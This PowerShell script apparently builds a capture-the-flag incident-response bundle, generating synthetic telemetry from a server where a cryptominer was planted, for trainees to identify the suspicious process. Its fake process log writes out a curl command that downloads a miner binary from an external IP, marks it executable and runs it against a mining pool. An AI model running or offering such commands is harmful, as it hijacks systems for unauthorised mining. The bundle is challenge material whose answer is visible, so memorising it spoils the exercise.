param()

$ErrorActionPreference = "Stop"

$bundleName = "m2-03-unknown-process"
$artifactRoot = Join-Path $PSScriptRoot "..\artifacts\m2"
$artifactRoot = [System.IO.Path]::GetFullPath($artifactRoot)
$zipPath = Join-Path $artifactRoot "$bundleName.zip"
$buildRoot = Join-Path $env:TEMP "m2_03_realworld_build"
$bundleRoot = Join-Path $buildRoot $bundleName

function Write-TextFile {
    param([string]$Path, [string]$Content)
    $parent = Split-Path -Parent $Path
    if ($parent) {
        New-Item -ItemType Directory -Force -Path $parent | Out-Null
    }
    [System.IO.File]::WriteAllText(
        $Path,
        $Content.Replace("`n", [Environment]::NewLine),
        [System.Text.Encoding]::UTF8
    )
}

function Write-LinesFile {
    param([string]$Path, [System.Collections.Generic.List[string]]$Lines)
    $parent = Split-Path -Parent $Path
    if ($parent) {
        New-Item -ItemType Directory -Force -Path $parent | Out-Null
    }
    [System.IO.File]::WriteAllLines($Path, $Lines, [System.Text.Encoding]::UTF8)
}

function New-ProcessSnapshot {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("timestamp_utc,host,pid,ppid,user,process_name,cpu_pct,mem_mb,path,signed,baseline_status")
    $base = [datetime]::SpecifyKind([datetime]"2026-03-06T05:00:00", [DateTimeKind]::Utc)
    $procs = @("explorer.exe","chrome.exe","sshd","systemd","nginx","backup-agent","log-shipper")

    for ($i = 0; $i -lt 8600; $i++) {
        $ts = $base.AddMilliseconds($i * 620).ToString("o")
        $proc = $procs[$i % $procs.Count]
        $cpu = 0.4 + (($i * 3) % 22) / 10.0
        $mem = 48 + (($i * 5) % 620)
        $user = if ($proc -eq "systemd") { "root" } else { "svc_app" }
        $signed = if ($proc -eq "log-shipper") { "no" } else { "yes" }
        $baseline = if ($proc -eq "log-shipper") { "approved_exception" } else { "approved" }
        $path = if ($proc -eq "nginx") { "/usr/sbin/nginx" } elseif ($proc -eq "sshd") { "/usr/sbin/sshd" } else { "/opt/runtime/$proc" }
        $lines.Add("$ts,prod-srv-11,$((2200 + $i)),$((1200 + ($i % 900))),$user,$proc,$cpu,$mem,$path,$signed,$baseline")
    }

    $lines.Add("2026-03-06T08:31:11Z,prod-srv-11,39911,2210,svc_app,cryptominer,97.8,1820,/tmp/.xmr/cryptominer,no,unknown")
    $lines.Add("2026-03-06T08:31:19Z,prod-srv-11,39911,2210,svc_app,cryptominer,98.3,1844,/tmp/.xmr/cryptominer,no,unknown")
    $lines.Add("2026-03-06T08:31:28Z,prod-srv-11,39911,2210,svc_app,cryptominer,99.1,1867,/tmp/.xmr/cryptominer,no,unknown")

    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-ProcessCreationLog {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $base = [datetime]::SpecifyKind([datetime]"2026-03-06T04:30:00", [DateTimeKind]::Utc)
    $entries = @(
        @{ parent = "systemd"; proc = "nginx"; cmd = "/usr/sbin/nginx -g daemon off;" },
        @{ parent = "systemd"; proc = "sshd"; cmd = "/usr/sbin/sshd -D" },
        @{ parent = "systemd"; proc = "backup-agent"; cmd = "/opt/runtime/backup-agent --cycle" },
        @{ parent = "nginx"; proc = "php-fpm"; cmd = "/usr/sbin/php-fpm --nodaemonize" }
    )

    for ($i = 0; $i -lt 7600; $i++) {
        $ts = $base.AddSeconds($i * 4).ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
        $e = $entries[$i % $entries.Count]
        $lines.Add("$ts host=prod-srv-11 pid=$((2800 + $i)) ppid=$((1400 + ($i % 700))) user=svc_app parent=""$($e.parent)"" process=""$($e.proc)"" cmd=""$($e.cmd)""")
    }

    $lines.Add("2026-03-06T08:31:02.114Z host=prod-srv-11 pid=39890 ppid=2871 user=svc_app parent=""bash"" process=""curl"" cmd=""curl -fsSL http://198.51.100.88/xmrig.bin -o /tmp/.xmr/cryptominer""")
    $lines.Add("2026-03-06T08:31:06.233Z host=prod-srv-11 pid=39902 ppid=39890 user=svc_app parent=""curl"" process=""chmod"" cmd=""chmod +x /tmp/.xmr/cryptominer""")
    $lines.Add("2026-03-06T08:31:09.801Z host=prod-srv-11 pid=39911 ppid=39902 user=svc_app parent=""chmod"" process=""cryptominer"" cmd=""/tmp/.xmr/cryptominer --pool pool.monero.invalid:4444 --wallet 4AxR... --threads 6""")

    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-ResourceUsage {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("timestamp_utc,host,process_name,pid,cpu_pct,mem_mb,threads,io_read_mb_s,io_write_mb_s,state")
    $base = [datetime]::SpecifyKind([datetime]"2026-03-06T05:00:00", [DateTimeKind]::Utc)

    for ($i = 0; $i -lt 5400; $i++) {
        $ts = $base.AddSeconds($i * 5).ToString("o")
        $proc = if (($i % 3) -eq 0) { "nginx" } else { "php-fpm" }
        $cpu = 2.1 + (($i * 5) % 90) / 10.0
        $mem = 120 + (($i * 7) % 900)
        $lines.Add("$ts,prod-srv-11,$proc,$((3200 + ($i % 500))),$cpu,$mem,$((3 + ($i % 16))),$((0.1 + (($i % 7) / 10.0))),$((0.1 + (($i % 5) / 10.0))),running")
    }

    $lines.Add("2026-03-06T08:31:12Z,prod-srv-11,cryptominer,39911,97.8,1820,42,0.4,0.1,running")
    $lines.Add("2026-03-06T08:31:20Z,prod-srv-11,cryptominer,39911,98.5,1844,44,0.4,0.1,running")
    $lines.Add("2026-03-06T08:31:29Z,prod-srv-11,cryptominer,39911,99.1,1867,45,0.5,0.1,running")

    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-NetworkConnections {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("timestamp_utc,host,pid,process_name,src_ip,src_port,dst_ip,dst_port,proto,state,bytes_out,class")
    $base = [datetime]::SpecifyKind([datetime]"2026-03-06T05:00:00", [DateTimeKind]::Utc)

    for ($i = 0; $i -lt 5100; $i++) {
        $ts = $base.AddMilliseconds($i * 710).ToString("o")
        $proc = if (($i % 2) -eq 0) { "nginx" } else { "php-fpm" }
        $dst = if ($proc -eq "nginx") { "172.67.10.$(10 + ($i % 80))" } else { "10.44.8.$(20 + ($i % 140))" }
        $port = if ($proc -eq "nginx") { 443 } else { 3306 }
        $class = if ($proc -eq "nginx") { "web-normal" } else { "db-normal" }
        $lines.Add("$ts,prod-srv-11,$((3300 + ($i % 600))),$proc,10.44.8.11,$((40000 + ($i % 2000))),$dst,$port,tcp,ESTABLISHED,$((1200 + (($i * 21) % 88000))),$class")
    }

    $lines.Add("2026-03-06T08:31:15Z,prod-srv-11,39911,cryptominer,10.44.8.11,48882,203.0.113.120,4444,tcp,ESTABLISHED,982341,mining-pool")
    $lines.Add("2026-03-06T08:31:22Z,prod-srv-11,39911,cryptominer,10.44.8.11,48882,203.0.113.120,4444,tcp,ESTABLISHED,1012254,mining-pool")
    $lines.Add("2026-03-06T08:31:30Z,prod-srv-11,39911,cryptominer,10.44.8.11,48882,203.0.113.120,4444,tcp,ESTABLISHED,1048921,mining-pool")

    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-EdrAlerts {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $base = [datetime]::SpecifyKind([datetime]"2026-03-06T05:00:00", [DateTimeKind]::Utc)
    $signals = @("unsigned_binary_exec","shell_download","abnormal_cpu_spike","suspicious_outbound_conn")

    for ($i = 0; $i -lt 3900; $i++) {
        $entry = [ordered]@{
            timestamp = $base.AddSeconds($i * 7).ToString("o")
            host = "prod-srv-11"
            severity = if (($i % 173) -eq 0) { "medium" } else { "low" }
            signal = $signals[$i % $signals.Count]
            process = if (($i % 2) -eq 0) { "backup-agent" } else { "log-shipper" }
            status = if (($i % 173) -eq 0) { "closed_false_positive" } else { "informational" }
            note = "baseline telemetry"
        }
        $lines.Add(($entry | ConvertTo-Json -Compress))
    }

    $lines.Add((([ordered]@{
        timestamp = "2026-03-06T08:31:09Z"
        host = "prod-srv-11"
        severity = "high"
        signal = "unknown_process_execution"
        process = "cryptominer"
        status = "open"
        note = "binary not present in approved runtime baseline"
    }) | ConvertTo-Json -Compress))
    $lines.Add((([ordered]@{
        timestamp = "2026-03-06T08:31:15Z"
        host = "prod-srv-11"
        severity = "critical"
        signal = "cryptomining_behavior"
        process = "cryptominer"
        status = "open"
        note = "sustained >95% CPU + outbound mining-pool traffic"
    }) | ConvertTo-Json -Compress))

    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-HashReputation {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("sha256,process_name,signed,vt_detections,reputation,last_seen,note")
    for ($i = 0; $i -lt 2400; $i++) {
        $hash = "{0:x64}" -f (900000000000 + $i)
        $proc = if (($i % 3) -eq 0) { "nginx" } elseif (($i % 3) -eq 1) { "php-fpm" } else { "backup-agent" }
        $signed = if ($proc -eq "backup-agent") { "no" } else { "yes" }
        $det = if ($signed -eq "yes") { 0 } else { 1 }
        $rep = if ($det -eq 0) { "known-good" } else { "internal-exception" }
        $lines.Add("$hash,$proc,$signed,$det,$rep,2026-03-05,routine baseline entry")
    }
    $lines.Add("a4f9054cf1599d4ddc81ff5a21f5067be1c8512f54f69f96f9f4f032f5ac8de1,cryptominer,no,51,malicious,2026-03-06,linked to commodity cryptomining toolkit")
    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-BaselinePolicy {
    param([string]$OutputPath)

    $content = @'
Approved Runtime Baseline (Excerpt)

Host profile: prod-linux-web
Allowed process names:
- systemd
- sshd
- nginx
- php-fpm
- backup-agent
- log-shipper

Any unsigned process outside this allowlist must be treated as suspicious pending IR review.
'@
    Write-TextFile -Path $OutputPath -Content $content
}

Remove-Item -Recurse -Force $buildRoot -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Force -Path (Join-Path $bundleRoot "evidence") | Out-Null

$description = @'
Challenge: M2-03 Unknown Process (Real-World Investigation Pack)

Scenario:
Endpoint telemetry indicates an unapproved process running on a production server.
Evidence includes process snapshots, process creation logs, resource usage, network connections,
EDR alerts, hash reputation records, and runtime baseline policy.

Task:
Identify the suspicious process name.

Flag format:
CTF{process_name}
'@
Write-TextFile -Path (Join-Path $bundleRoot "description.txt") -Content $description

$ticket = @'
Incident: INC-2026-4618
Severity: High
Queue: SOC Triage

Summary:
Server `prod-srv-11` showed sustained high CPU utilization and anomalous outbound traffic.
Endpoint monitoring flagged a process not present in approved runtime baseline.

Scope:
- Host: prod-srv-11
- Window: 2026-03-06 08:30 UTC onward

Deliverable:
Identify the suspicious process name.
'@
Write-TextFile -Path (Join-Path $bundleRoot "evidence\briefing\incident_ticket.txt") -Content $ticket

$handoff = @'
Analyst handoff:
- Correlate process identity, resource behavior, and outbound connection profile.
- Verify process against runtime baseline allowlist and hash reputation.
- Distinguish approved unsigned exceptions from truly suspicious process activity.
'@
Write-TextFile -Path (Join-Path $bundleRoot "evidence\briefing\analyst_handoff.txt") -Content $handoff

New-ProcessSnapshot -OutputPath (Join-Path $bundleRoot "evidence\host\process_snapshot.csv")
New-ProcessCreationLog -OutputPath (Join-Path $bundleRoot "evidence\host\process_creation.log")
New-ResourceUsage -OutputPath (Join-Path $bundleRoot "evidence\host\resource_usage_timeseries.csv")
New-NetworkConnections -OutputPath (Join-Path $bundleRoot "evidence\network\process_connections.csv")
New-EdrAlerts -OutputPath (Join-Path $bundleRoot "evidence\security\edr_process_alerts.jsonl")
New-HashReputation -OutputPath (Join-Path $bundleRoot "evidence\security\hash_reputation.csv")
New-BaselinePolicy -OutputPath (Join-Path $bundleRoot "evidence\policy\approved_runtime_baseline.txt")

New-Item -ItemType Directory -Force -Path $artifactRoot | Out-Null
if (Test-Path $zipPath) {
    Remove-Item -Force $zipPath
}
Compress-Archive -Path (Join-Path $bundleRoot "*") -DestinationPath $zipPath -Force
Remove-Item -Recurse -Force $buildRoot

Get-Item $zipPath | Select-Object FullName, Length, LastWriteTime
